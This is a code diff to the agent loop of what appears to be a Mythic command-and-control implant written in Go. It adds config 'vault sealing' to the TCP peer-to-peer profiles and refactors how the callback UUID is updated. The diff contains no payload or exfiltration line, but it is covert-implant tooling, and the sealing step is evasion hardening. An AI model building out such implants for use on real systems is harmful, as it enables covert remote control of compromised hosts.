@@ -255,6 +255,9 @@ func runAgent() {
 		// TCP P2P mode — this agent is a child that listens for a parent connection
 		log.Printf("bind %s", tcpBindAddress)
 		tcpProfile := tcp.NewTCPProfile(tcpBindAddress, encryptionKey, debugBool)
+		if err := tcpProfile.SealConfig(); err != nil {
+			log.Printf("tcp vault seal failed: %v", err)
+		}
 		c2 = profiles.NewTCPProfile(tcpProfile)
 		// Make TCP profile available to link/unlink commands
 		commands.SetTCPProfile(tcpProfile)
@@ -297,6 +300,9 @@ func runAgent() {
 
 		// TCP P2P child management (Discord egress agents can also link to TCP children)
 		tcpP2P := tcp.NewTCPProfile("", encryptionKey, debugBool)
+		if err := tcpP2P.SealConfig(); err != nil {
+			log.Printf("tcp p2p vault seal failed: %v", err)
+		}
 		commands.SetTCPProfile(tcpP2P)
 
 		// Wire up delegate hooks for P2P routing through Discord
@@ -384,6 +390,9 @@ func runAgent() {
 
 		// TCP P2P child management
 		tcpP2P := tcp.NewTCPProfile("", encryptionKey, debugBool)
+		if err := tcpP2P.SealConfig(); err != nil {
+			log.Printf("tcp p2p vault seal failed: %v", err)
+		}
 		commands.SetTCPProfile(tcpP2P)
 
 		// Wire up delegate hooks
@@ -494,6 +503,9 @@ func runAgent() {
 		// Also create a TCP profile instance for P2P child management.
 		// Even HTTP egress agents can link to TCP children.
 		tcpP2P := tcp.NewTCPProfile("", encryptionKey, debugBool)
+		if err := tcpP2P.SealConfig(); err != nil {
+			log.Printf("tcp p2p vault seal failed: %v", err)
+		}
 		commands.SetTCPProfile(tcpP2P)
 
 		// Wire up delegate hooks so the HTTP profile routes P2P delegate messages
@@ -563,8 +575,8 @@ checkinDone:
 
 	// After successful HTTP checkin, propagate the callback UUID to the TCP P2P instance.
 	// This ensures edge messages use the correct parent UUID for Mythic's P2P graph.
-	if tcpP2P := commands.GetTCPProfile(); tcpP2P != nil && tcpP2P.CallbackUUID == "" {
-		tcpP2P.CallbackUUID = c2.GetCallbackUUID()
+	if tcpP2P := commands.GetTCPProfile(); tcpP2P != nil && tcpP2P.GetCallbackUUID() == "" {
+		tcpP2P.UpdateCallbackUUID(c2.GetCallbackUUID())
 	}
 
 	// Create context for graceful shutdown
